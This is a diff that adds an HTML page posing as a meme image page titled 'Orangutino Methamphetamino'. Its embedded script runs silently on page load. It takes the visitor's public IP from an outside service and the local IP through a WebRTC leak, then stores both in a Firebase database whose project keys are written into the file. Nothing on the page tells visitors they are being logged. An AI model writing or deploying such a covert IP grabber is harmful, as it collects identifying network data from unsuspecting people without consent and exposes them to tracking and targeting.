@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<style>
+  body {
+    background-color: black;
+    color: white;
+    text-align: center;
+  }
+  .image {
+    width: 400px;
+    height: 300px;
+    background-image: url('images.jpeg');
+    background-size: cover;
+    background-position: center;
+    border: 1px solid white;
+    margin: 20px auto;
+  }
+</style>
+</head>
+<body>
+<h1>Orangutino Methamphetamino</h1>
+<div class="image"></div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyCbA9QaYmD0Ck-VQVOaXsZvV0aFTtET0TM",
+    authDomain: "imagehub-745c1.firebaseapp.com",
+    projectId: "imagehub-745c1",
+    storageBucket: "imagehub-745c1.firebasestorage.app",
+    messagingSenderId: "719828224137",
+    appId: "1:719828224137:web:f05ee9d9b22dfb6b4a9e58",
+    measurementId: "G-45VHM7HWG0"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  async function getPublicIP() {
+    try {
+      const resp = await fetch('https://api.ipify.org?format=json');
+      if(resp.ok) {
+        const data = await resp.json();
+        return data.ip;
+      }
+    } catch(e) {
+      console.error('Fehler Public IP:', e);
+    }
+    return 'unknown';
+  }
+
+  async function getLocalIP() {
+    return new Promise((resolve) => {
+      const pc = new RTCPeerConnection({iceServers:[]});
+      pc.createDataChannel("");
+      pc.createOffer().then(offer => pc.setLocalDescription(offer));
+      pc.onicecandidate = (event) => {
+        if(!event.candidate) return;
+        const ipMatch = event.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3})/);
+        if(ipMatch) {
+          resolve(ipMatch[1]);
+          pc.onicecandidate = null;
+        }
+      };
+      setTimeout(() => resolve('unknown'), 2000); // fallback
+    });
+  }
+
+  async function saveIPs() {
+    const publicIP = await getPublicIP();
+    const localIP = await getLocalIP();
+
+    try {
+      await addDoc(collection(db, "publicIPs"), {
+        publicIP,
+        localIP,
+        timestamp: serverTimestamp()
+      });
+      console.log('IPs gespeichert:', { publicIP, localIP });
+    } catch(e) {
+      console.error('Fehler beim Speichern:', e);
+    }
+  }
+
+  saveIPs();
+</script>
+</body>
+</html>
